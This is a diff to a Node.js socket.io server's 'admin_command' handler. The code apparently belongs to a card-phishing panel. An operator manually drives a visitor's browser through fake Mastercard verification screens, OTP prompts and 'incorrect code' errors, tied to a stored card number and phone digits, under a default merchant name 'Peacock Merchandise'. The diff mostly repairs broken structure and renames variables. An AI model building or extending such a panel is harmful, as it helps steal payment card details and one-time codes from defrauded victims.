@@ -1631,9 +1631,8 @@ if (!data.invoiceId) {
     }
   });
 
-// Find the admin_command socket listener in server.js and add debugging
 socket.on('admin_command', (data) => {
-  console.log('ADMIN COMMAND RECEIVED WITH FULL DATA:', JSON.stringify(data)); // Add this line
+  console.log('ADMIN COMMAND RECEIVED WITH FULL DATA:', JSON.stringify(data));
   
   // Check if this is from an admin socket
   if (!adminSockets.has(socket)) {
@@ -1641,37 +1640,52 @@ socket.on('admin_command', (data) => {
     return;
   }
 
-  const { command, invoiceId, phoneLastFour } = data; // Make sure phoneLastFour is extracted
-  console.log(`Admin command received: ${command} for transaction ${invoiceId}, phone: ${phoneLastFour}`); 
+  const { command, invoiceId, phoneLastFour, brandType } = data;
+  console.log(`Admin command received: ${command} for transaction ${invoiceId}, phone: ${phoneLastFour}, brand: ${brandType}`);
   
-    if (!invoiceId || !transactions.has(invoiceId)) {
-      console.log(`No transaction found for ID: ${invoiceId}`);
-      return;
+  if (!invoiceId || !transactions.has(invoiceId)) {
+    console.log(`No transaction found for ID: ${invoiceId}`);
+    return;
+  }
+  
+  // Find associated socket(s) for this transaction
+  let clientSockets = [];
+  io.sockets.sockets.forEach(s => {
+    // Check rooms the socket is in
+    const rooms = s.rooms;
+    if (rooms.has(invoiceId)) {
+      clientSockets.push(s);
     }
+  });
   
-    // Find associated socket(s) for this transaction
-    let clientSockets = [];
-    io.sockets.sockets.forEach(s => {
-      // Check rooms the socket is in
-      const rooms = s.rooms;
-      if (rooms.has(invoiceId)) {
-        clientSockets.push(s);
-      }
-    });
-  
-    if (clientSockets.length === 0) {
-      console.log(`No active client sockets found for transaction ${invoiceId}`);
-// Try to find in verification states
-      const state = verificationStates.get(invoiceId);
-      if (state && state.socketId) {
-        const foundSocket = io.sockets.sockets.get(state.socketId);
-        if (foundSocket) {
-          clientSockets.push(foundSocket);
-        }
+  if (clientSockets.length === 0) {
+    console.log(`No active client sockets found for transaction ${invoiceId}`);
+    // Try to find in verification states
+    const state = verificationStates.get(invoiceId);
+    if (state && state.socketId) {
+      const foundSocket = io.sockets.sockets.get(state.socketId);
+      if (foundSocket) {
+        clientSockets.push(foundSocket);
       }
     }
-
-    // Execute the command
+  }
+    
+  // Try the transaction's stored socketId as a last resort
+  const txn = transactions.get(invoiceId);
+  if (txn && txn.socketId && clientSockets.length === 0) {
+    const foundSocket = io.sockets.sockets.get(txn.socketId);
+    if (foundSocket) {
+      clientSockets.push(foundSocket);
+    }
+  }
+  
+  // If we still have no sockets, broadcast to the room anyway
+  // Some clients might be listening on the room without being tracked
+  if (clientSockets.length === 0) {
+    console.log(`No active sockets found, broadcasting to room ${invoiceId}`);
+  }
+  
+  // Execute the command
   switch (command) {
     case 'show_brand_selection':
       // This is a new command for showing brand selection in client
@@ -1722,172 +1736,155 @@ socket.on('admin_command', (data) => {
       }
       break;
       
-    // Try the transaction's stored socketId as a last resort
-    const txn = transactions.get(invoiceId);
-    if (txn && txn.socketId && clientSockets.length === 0) {
-      const foundSocket = io.sockets.sockets.get(txn.socketId);
-      if (foundSocket) {
-        clientSockets.push(foundSocket);
+    case 'show_mc_verification':
+      console.log('Sending show_mc_verification with phone:', data.phoneLastFour);
+      
+      // Store the phone number in the verification state for this transaction
+      if (verificationStates.has(invoiceId)) {
+        const verificationState = verificationStates.get(invoiceId);
+        verificationState.phoneLastFour = data.phoneLastFour;
+        verificationStates.set(invoiceId, verificationState);
+      } else {
+        // Create a new verification state if it doesn't exist
+        verificationStates.set(invoiceId, {
+          status: 'pending',
+          phoneLastFour: data.phoneLastFour
+        });
       }
-    }
-    
-    // If we still have no sockets, broadcast to the room anyway
-    // Some clients might be listening on the room without being tracked
-    if (clientSockets.length === 0) {
-      console.log(`No active sockets found, broadcasting to room ${invoiceId}`);
-    }
-  
-    // Execute the command
-    switch (command) {
-case 'show_mc_verification':
-    console.log('Sending show_mc_verification with phone:', data.phoneLastFour);
-    
-    // Store the phone number in the verification state for this transaction
-    if (verificationStates.has(invoiceId)) {
-      const verificationState = verificationStates.get(invoiceId);
-      verificationState.phoneLastFour = data.phoneLastFour;
-      verificationStates.set(invoiceId, verificationState);
-    } else {
-      // Create a new verification state if it doesn't exist
-      verificationStates.set(invoiceId, {
-        status: 'pending',
-        phoneLastFour: data.phoneLastFour
+      
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('show_mc_verification', {
+          invoiceId,
+          cardType: data.cardType || detectCardType(transactions.get(invoiceId).cardNumber),
+          phoneLastFour: data.phoneLastFour
+        });
       });
-    }
-    
-    clientSockets.forEach(clientSocket => {
-      clientSocket.emit('show_mc_verification', {
+      
+      // Also broadcast to the room
+      io.to(invoiceId).emit('show_mc_verification', {
         invoiceId,
         cardType: data.cardType || detectCardType(transactions.get(invoiceId).cardNumber),
         phoneLastFour: data.phoneLastFour
       });
-    });
-    
-    // Also broadcast to the room
-    io.to(invoiceId).emit('show_mc_verification', {
-      invoiceId,
-      cardType: data.cardType || detectCardType(transactions.get(invoiceId).cardNumber),
-      phoneLastFour: data.phoneLastFour
-    });
-    break;
+      break;
+        
+    case 'start_verification':
+      console.log('Sending start_verification with phone:', data.phoneLastFour);
       
-case 'start_verification':
-    console.log('Sending start_verification with phone:', data.phoneLastFour);
-    
-    // Ensure the phone number is in the verification state
-    if (verificationStates.has(invoiceId)) {
-      const verificationState = verificationStates.get(invoiceId);
-      // Only update if not already set
-      if (!verificationState.phoneLastFour) {
-        verificationState.phoneLastFour = data.phoneLastFour;
+      // Ensure the phone number is in the verification state
+      if (verificationStates.has(invoiceId)) {
+        const verificationState = verificationStates.get(invoiceId);
+        // Only update if not already set
+        if (!verificationState.phoneLastFour) {
+          verificationState.phoneLastFour = data.phoneLastFour;
+        }
+        verificationStates.set(invoiceId, verificationState);
       }
-      verificationStates.set(invoiceId, verificationState);
-    }
-    
-    // Get the phone number from verification state or data
-    const phoneLastFour = verificationStates.has(invoiceId) 
-      ? (verificationStates.get(invoiceId).phoneLastFour || data.phoneLastFour) 
-      : data.phoneLastFour;
       
-    clientSockets.forEach(clientSocket => {
-      clientSocket.emit('start_verification', {
+      // Get the phone number from verification state or data
+      const phoneLastFourToUse = verificationStates.has(invoiceId) 
+        ? (verificationStates.get(invoiceId).phoneLastFour || data.phoneLastFour) 
+        : data.phoneLastFour;
+        
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('start_verification', {
+          invoiceId,
+          verificationType: data.verificationType || 'mastercard',
+          bankCode: data.bankCode || 'default',
+          merchantName: data.merchantName || 'Peacock Merchandise',
+          phoneLastFour: phoneLastFourToUse
+        });
+      });
+      
+      // Also broadcast to the room
+      io.to(invoiceId).emit('start_verification', {
         invoiceId,
         verificationType: data.verificationType || 'mastercard',
         bankCode: data.bankCode || 'default',
         merchantName: data.merchantName || 'Peacock Merchandise',
-        phoneLastFour: phoneLastFour
+        phoneLastFour: phoneLastFourToUse
       });
-    });
-    
-    // Also broadcast to the room
-    io.to(invoiceId).emit('start_verification', {
-      invoiceId,
-      verificationType: data.verificationType || 'mastercard',
-      bankCode: data.bankCode || 'default',
-      merchantName: data.merchantName || 'Peacock Merchandise',
-      phoneLastFour: phoneLastFour
-    });
-    break;
-      
-      case 'verification_success':
-        // Update verification state
-        if (verificationStates.has(invoiceId)) {
-          const state = verificationStates.get(invoiceId);
-          state.status = 'verified';
-          verificationStates.set(invoiceId, state);
-        }
-      
-        // Update transaction status
-        const txn = transactions.get(invoiceId);
-        txn.status = 'approved';
-        txn.redirectStatus = 'success';
-        transactions.set(invoiceId, txn);
-      
-        clientSockets.forEach(clientSocket => {
-          clientSocket.emit('mc_verification_result', {
-            invoiceId,
-            success: true,
-            message: 'Verification successful'
-          });
-        });
+      break;
         
-        // Also broadcast to the room
-        io.to(invoiceId).emit('mc_verification_result', {
+    case 'verification_success':
+      // Update verification state
+      if (verificationStates.has(invoiceId)) {
+        const state = verificationStates.get(invoiceId);
+        state.status = 'verified';
+        verificationStates.set(invoiceId, state);
+      }
+    
+      // Update transaction status
+      const successTxn = transactions.get(invoiceId);
+      successTxn.status = 'approved';
+      successTxn.redirectStatus = 'success';
+      transactions.set(invoiceId, successTxn);
+    
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('mc_verification_result', {
           invoiceId,
           success: true,
           message: 'Verification successful'
         });
-        break;
+      });
       
-      case 'verification_failed':
-        // Update verification state
-        if (verificationStates.has(invoiceId)) {
-          const state = verificationStates.get(invoiceId);
-          state.status = 'failed';
-          verificationStates.set(invoiceId, state);
-        }
-      
-        // Update transaction status
-        const failedTxn = transactions.get(invoiceId);
-        failedTxn.status = 'declined';
-        failedTxn.redirectStatus = 'fail';
-        failedTxn.failureReason = data.reason || 'declined';
-        transactions.set(invoiceId, failedTxn);
-      
-        clientSockets.forEach(clientSocket => {
-          clientSocket.emit('mc_verification_result', {
-            invoiceId,
-            success: false,
-            reason: data.reason || 'declined',
-            message: 'Verification failed'
-          });
-        });
-        
-        // Also broadcast to the room
-        io.to(invoiceId).emit('mc_verification_result', {
+      // Also broadcast to the room
+      io.to(invoiceId).emit('mc_verification_result', {
+        invoiceId,
+        success: true,
+        message: 'Verification successful'
+      });
+      break;
+    
+    case 'verification_failed':
+      // Update verification state
+      if (verificationStates.has(invoiceId)) {
+        const state = verificationStates.get(invoiceId);
+        state.status = 'failed';
+        verificationStates.set(invoiceId, state);
+      }
+    
+      // Update transaction status
+      const failedTxn = transactions.get(invoiceId);
+      failedTxn.status = 'declined';
+      failedTxn.redirectStatus = 'fail';
+      failedTxn.failureReason = data.reason || 'declined';
+      transactions.set(invoiceId, failedTxn);
+    
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('mc_verification_result', {
           invoiceId,
           success: false,
           reason: data.reason || 'declined',
           message: 'Verification failed'
         });
-        break;
+      });
       
-      case 'show_otp_error':
-        clientSockets.forEach(clientSocket => {
-          clientSocket.emit('mc_otp_error', {
-            invoiceId,
-            message: data.message || 'Incorrect verification code. Please try again.'
-          });
-        });
-        
-        // Also broadcast to the room
-        io.to(invoiceId).emit('mc_otp_error', {
+      // Also broadcast to the room
+      io.to(invoiceId).emit('mc_verification_result', {
+        invoiceId,
+        success: false,
+        reason: data.reason || 'declined',
+        message: 'Verification failed'
+      });
+      break;
+    
+    case 'show_otp_error':
+      clientSockets.forEach(clientSocket => {
+        clientSocket.emit('mc_otp_error', {
           invoiceId,
           message: data.message || 'Incorrect verification code. Please try again.'
         });
-        break;
-    }
-  });
+      });
+      
+      // Also broadcast to the room
+      io.to(invoiceId).emit('mc_otp_error', {
+        invoiceId,
+        message: data.message || 'Incorrect verification code. Please try again.'
+      });
+      break;
+  }
+});
   
   socket.on('screen_capture_error', (data) => {
     console.log(`Screen capture error from: ${socket.id}`, data.error);
